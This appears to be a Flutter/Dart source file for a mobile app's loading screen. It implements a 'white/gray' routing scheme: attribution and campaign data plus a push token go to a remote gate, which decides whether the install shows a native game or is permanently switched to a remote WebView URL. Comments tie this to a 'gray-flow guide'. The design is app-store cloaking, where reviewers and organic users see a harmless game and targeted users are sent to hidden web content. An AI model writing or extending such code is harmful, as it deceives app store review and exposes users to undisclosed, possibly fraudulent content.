import 'dart:async';
import 'dart:io';
import 'dart:math';

import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

import '../bridge/insight.dart';
import '../contract/path_choice.dart';
import '../contract/shell_verdict.dart';
import '../core/app_colors.dart';
import '../core/asset_paths.dart';
import '../core/storage_service.dart';
import '../overlay/alert_prompt.dart';
import '../overlay/offline_scene.dart';
import '../overlay/stream_scene.dart';
import '../screens/home_screen.dart';
import 'alert_center.dart';
import 'remote_valve.dart';
import 'stash_hold.dart';
import 'track_beacon.dart';
import 'wire_watch.dart';

// ============================================================
// BOOT PIPELINE — loading screen + shell routing
// ============================================================
// The only screen shown between cold-start and the terminal route
// (WebView or native game). Runs the connectivity gate, attribution,
// remote config query and precache, in that order, while an animated
// progress bar climbs from 0 to 100 %.
//
// Route decision (matches the state machine in the gray-flow guide):
//   ┌──────────────────────────────────────────────────────────────┐
//   │ PathChoice.local     → white part (native game HomeScreen)   │
//   │ PathChoice.streamed  → gray part (StreamScene)               │
//   │ PathChoice.undecided → first launch, run the full pipeline   │
//   └──────────────────────────────────────────────────────────────┘
//
// [FIRST-LAUNCH UX INVARIANT] If we're offline on first launch, the
// no-Wi-Fi scene appears immediately (before AppsFlyer boot). Retry
// re-runs the full pipeline. AppMode stays `undecided` throughout, so
// once connectivity returns and the gate answers, we commit the real
// choice. See android_gray_guide.md §"First-Launch UX Contract".
// ============================================================

class BootPipeline extends StatefulWidget {
  const BootPipeline({
    super.key,
    required this.stash,
    required this.wireWatch,
    required this.beacon,
    required this.remoteValve,
    required this.alertCenter,
  });

  final StashHold stash;
  final WireWatch wireWatch;
  final TrackBeacon beacon;
  final RemoteValve remoteValve;
  final AlertCenter alertCenter;

  @override
  State<BootPipeline> createState() => _BootPipelineState();
}

class _BootPipelineState extends State<BootPipeline> {
  double _progress = 0;
  int _dotCount = 1;
  Timer? _dotTicker;
  bool _routed = false;

  static const List<int> _stageTargets = <int>[10, 24, 39, 55, 70, 83, 93, 98];

  @override
  void initState() {
    super.initState();

    // The pipeline (loading screen) is the ONLY screen allowed to rotate
    // freely. The native game locks back to portrait when it starts, and
    // the WebView unlocks all four orientations when it starts.
    SystemChrome.setPreferredOrientations(const <DeviceOrientation>[
      DeviceOrientation.portraitUp,
      DeviceOrientation.portraitDown,
      DeviceOrientation.landscapeLeft,
      DeviceOrientation.landscapeRight,
    ]);

    _dotTicker = Timer.periodic(const Duration(milliseconds: 420), (_) {
      if (!mounted) return;
      setState(() => _dotCount = (_dotCount % 3) + 1);
    });

    widget.alertCenter.onTokenRoll = _repostOnTokenRoll;
    Insight.screen('loading');
    _drive();
  }

  @override
  void dispose() {
    _dotTicker?.cancel();
    widget.alertCenter.onTokenRoll = null;
    super.dispose();
  }

  Future<void> _drive() async {
    // Kick off local preparation immediately — SharedPreferences + asset
    // precache are the game-side prerequisites and run in parallel with
    // the network probe / attribution wait.
    final Future<void> localPrep = _prepareLocalGame();

    // Start push wiring early so the token has time to arrive before we
    // POST the config body. Failures are non-fatal.
    unawaited(widget.alertCenter.wire());

    // Drive the visible progress bar in staged bursts. This runs in
    // parallel with the actual work; the last stage is capped at 98 %.
    final Future<void> visibleClimb = _climbProgress();

    // Route decision.
    switch (widget.stash.fetchPath()) {
      case PathChoice.local:
        // Returning organic install — never touch the network again.
        await Future.wait<void>(<Future<void>>[localPrep, visibleClimb]);
        await _lockPortraitAndRunGame();
        return;

      case PathChoice.streamed:
        await _resumeStreamedPath(visibleClimb: visibleClimb);
        return;

      case PathChoice.undecided:
        await _firstEncounter(
          localPrep: localPrep,
          visibleClimb: visibleClimb,
        );
        return;
    }
  }

  Future<void> _firstEncounter({
    required Future<void> localPrep,
    required Future<void> visibleClimb,
  }) async {
    final bool reachable = await widget.wireWatch.canReach();
    if (!reachable) {
      await visibleClimb;
      _swapToOffline();
      return;
    }

    await widget.beacon.arm();
    await Future.wait<void>(<Future<void>>[
      widget.beacon.attendInstall(),
      widget.beacon.attendDeepLink(),
    ]);

    final ShellVerdict verdict = await _askGate();

    if (verdict.approved && verdict.hasDestination) {
      await widget.stash.commitPath(PathChoice.streamed);
      await visibleClimb;
      await _finishProgress();
      Insight.tag('run_mode', 'web');
      Insight.event('route_web');
      _swapToStream(verdict.destination!);
    } else {
      // Config gate said "no". Commit local permanently — no more
      // config requests from this install forever (per contract §9).
      await widget.stash.commitPath(PathChoice.local);
      await Future.wait<void>(<Future<void>>[localPrep, visibleClimb]);
      await _lockPortraitAndRunGame();
    }
  }

  Future<void> _resumeStreamedPath({required Future<void> visibleClimb}) async {
    final bool reachable = await widget.wireWatch.canReach();
    if (!reachable) {
      await visibleClimb;
      _swapToOffline();
      return;
    }

    // A pending cold-start push URL wins over everything.
    final String? pending = await widget.stash.claimPushUrl();
    if (pending != null) {
      await visibleClimb;
      await _finishProgress();
      Insight.event('route_push_link');
      _swapToStream(pending);
      return;
    }

    final String? cached = await widget.stash.readStreamUrl();

    await widget.beacon.arm();
    await Future.wait<void>(<Future<void>>[
      widget.beacon.attendInstall(seconds: 10),
      widget.beacon.attendDeepLink(),
    ]);

    final ShellVerdict verdict = await _askGate();
    await visibleClimb;
    await _finishProgress();

    if (verdict.approved && verdict.hasDestination) {
      Insight.tag('run_mode', 'web');
      Insight.event('route_web');
      _swapToStream(verdict.destination!);
    } else if (cached != null) {
      Insight.tag('run_mode', 'web');
      Insight.event('route_cached_link');
      _swapToStream(cached);
    } else {
      _swapToOffline();
    }
  }

  Future<ShellVerdict> _askGate() async {
    final String locale = Platform.localeName.replaceAll('-', '_');
    final Map<String, dynamic> body = await widget.beacon.composeGateBody(
      localeTag: locale,
      pushToken: widget.alertCenter.token,
    );
    Insight.identify(
      body['af_id']?.toString(),
      tags: {
        'af_status': body['af_status']?.toString() ?? '',
        'media_source': body['media_source']?.toString() ?? '',
        'campaign': body['campaign']?.toString() ?? '',
        'os': body['os']?.toString() ?? '',
        'locale': body['locale']?.toString() ?? '',
      },
    );
    return widget.remoteValve.ask(body);
  }

  Future<void> _repostOnTokenRoll(String token) async {
    final String locale = Platform.localeName.replaceAll('-', '_');
    final Map<String, dynamic> body = await widget.beacon.composeGateBody(
      localeTag: locale,
      pushToken: token,
    );
    await widget.remoteValve.ask(body);
  }

  // ── Visual progress driver ──

  Future<void> _climbProgress() async {
    final Random rng = Random();
    for (final int target in _stageTargets) {
      await _animateTo(
        target.toDouble(),
        Duration(milliseconds: 210 + rng.nextInt(180)),
      );
      if (!mounted) return;
      await Future<void>.delayed(
        Duration(milliseconds: 60 + rng.nextInt(120)),
      );
      if (!mounted) return;
    }
  }

  Future<void> _finishProgress() async {
    await _animateTo(100, const Duration(milliseconds: 240));
    await Future<void>.delayed(const Duration(milliseconds: 220));
  }

  Future<void> _animateTo(double target, Duration duration) async {
    final double start = _progress;
    final int steps = (duration.inMilliseconds / 16).ceil().clamp(1, 60);
    for (int i = 1; i <= steps; i++) {
      if (!mounted) return;
      final double t = i / steps;
      final double eased = 1 - pow(1 - t, 3).toDouble();
      setState(() => _progress = start + (target - start) * eased);
      await Future<void>.delayed(Duration(milliseconds: (duration.inMilliseconds / steps).round()));
    }
    if (mounted) setState(() => _progress = target);
  }

  // ── Precache (only needed on the local path) ──

  Future<void> _prepareLocalGame() async {
    try {
      await StorageService.getInstance();
    } catch (_) {}
    if (!mounted) return;
    const List<String> paths = <String>[
      AssetPaths.gameNameLogo,
      AssetPaths.bg1,
      AssetPaths.bg2,
      AssetPaths.bg3,
      AssetPaths.activePlatform,
      AssetPaths.inactivePlatform,
      AssetPaths.obsidianStoneBlock,
      AssetPaths.fireCrystal,
      AssetPaths.moltenEmber,
      AssetPaths.lavaFissure,
      AssetPaths.volcanicAsh,
      AssetPaths.volcanicRock,
    ];
    for (final String p in paths) {
      if (!mounted) return;
      try {
        await precacheImage(AssetImage(p), context);
      } catch (_) {}
    }
  }

  // ── Route swaps ──

  Future<void> _lockPortraitAndRunGame() async {
    if (_routed || !mounted) return;
    await _finishProgress();
    if (!mounted) return;
    _routed = true;
    Insight.tag('run_mode', 'native');
    Insight.event('route_native');
    await SystemChrome.setPreferredOrientations(const <DeviceOrientation>[
      DeviceOrientation.portraitUp,
    ]);
    if (!mounted) return;
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(builder: (_) => const HomeScreen()),
    );
  }

  void _swapToStream(String destination) {
    if (_routed || !mounted) return;
    _routed = true;
    if (widget.stash.shouldSurfaceInvite()) {
      Navigator.of(context).pushReplacement(
        MaterialPageRoute<void>(
          builder: (_) => AlertPrompt(
            stash: widget.stash,
            alertCenter: widget.alertCenter,
            wireWatch: widget.wireWatch,
            streamUrl: destination,
          ),
        ),
      );
    } else {
      // Returning user skips the invite — classify their permission state now
      // so the notif_permission tag is never blank for this session.
      Insight.tag(
        'notif_permission',
        widget.stash.isInviteAccepted()
            ? 'granted'
            : widget.stash.isInviteOsRefused()
                ? 'os_denied'
                : 'snoozed',
      );
      Navigator.of(context).pushReplacement(
        MaterialPageRoute<void>(
          builder: (_) => StreamScene(
            streamUrl: destination,
            stash: widget.stash,
            alertCenter: widget.alertCenter,
            wireWatch: widget.wireWatch,
          ),
        ),
      );
    }
  }

  void _swapToOffline() {
    if (_routed || !mounted) return;
    _routed = true;
    Insight.event('route_offline');
    Navigator.of(context).pushReplacement(
      MaterialPageRoute<void>(
        builder: (_) => OfflineScene(
          rebuilder: (_) => BootPipeline(
            stash: widget.stash,
            wireWatch: widget.wireWatch,
            beacon: widget.beacon,
            remoteValve: widget.remoteValve,
            alertCenter: widget.alertCenter,
          ),
        ),
      ),
    );
  }

  // ── Build ──

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.obsidianDark,
      body: OrientationBuilder(
        builder: (BuildContext ctx, Orientation orientation) {
          final bool landscape = orientation == Orientation.landscape;
          final String bg = landscape
              ? AssetPaths.horizontalLoadingScreen
              : AssetPaths.verticalLoadingScreen;
          return Stack(
            fit: StackFit.expand,
            children: <Widget>[
              Container(color: AppColors.obsidianDark),
              Image.asset(bg, fit: BoxFit.cover),
              SafeArea(
                child: Align(
                  alignment: Alignment(0, landscape ? 0.68 : 0.72),
                  child: _LoadingBadge(
                    progress: _progress,
                    dotCount: _dotCount,
                    landscape: landscape,
                  ),
                ),
              ),
            ],
          );
        },
      ),
    );
  }
}

class _LoadingBadge extends StatelessWidget {
  const _LoadingBadge({
    required this.progress,
    required this.dotCount,
    required this.landscape,
  });

  final double progress;
  final int dotCount;
  final bool landscape;

  @override
  Widget build(BuildContext context) {
    final double screenWidth = MediaQuery.of(context).size.width;
    final double barWidth = screenWidth * (landscape ? 0.62 : 0.86);
    final double barHeight = landscape ? 24 : 26;
    final int pct = progress.clamp(0, 100).round();

    return Column(
      mainAxisSize: MainAxisSize.min,
      children: <Widget>[
        Text(
          'Loading${'.' * dotCount}',
          style: TextStyle(
            color: AppColors.textPrimary,
            fontSize: landscape ? 28 : 30,
            fontWeight: FontWeight.w800,
            letterSpacing: 1.4,
            height: 1.0,
            shadows: const <Shadow>[
              Shadow(color: Colors.black87, blurRadius: 8),
            ],
          ),
        ),
        SizedBox(height: landscape ? 16 : 16),
        Container(
          width: barWidth,
          height: barHeight,
          padding: const EdgeInsets.all(3),
          decoration: BoxDecoration(
            color: AppColors.obsidianPanel.withValues(alpha: 0.85),
            borderRadius: BorderRadius.circular(24),
            border: Border.all(
              color: AppColors.obsidianPanelLight,
              width: 1.5,
            ),
          ),
          child: LayoutBuilder(
            builder: (BuildContext ctx, BoxConstraints c) {
              return Stack(
                children: <Widget>[
                  ClipRRect(
                    borderRadius: BorderRadius.circular(16),
                    child: SizedBox(
                      width: c.maxWidth,
                      height: c.maxHeight,
                      child: FractionallySizedBox(
                        alignment: Alignment.centerLeft,
                        widthFactor: (progress / 100).clamp(0.0, 1.0),
                        child: DecoratedBox(
                          decoration: BoxDecoration(
                            gradient: AppColors.emberGradient,
                            boxShadow: <BoxShadow>[
                              BoxShadow(
                                color: AppColors.emberOrange
                                    .withValues(alpha: 0.7),
                                blurRadius: 8,
                                spreadRadius: 0.5,
                              ),
                            ],
                          ),
                        ),
                      ),
                    ),
                  ),
                ],
              );
            },
          ),
        ),
        SizedBox(height: landscape ? 12 : 14),
        Text(
          '$pct%',
          style: TextStyle(
            color: AppColors.emberYellow,
            fontSize: landscape ? 24 : 22,
            fontWeight: FontWeight.w800,
            height: 1.0,
            shadows: const <Shadow>[
              Shadow(color: Colors.black87, blurRadius: 6),
            ],
          ),
        ),
      ],
    );
  }
}
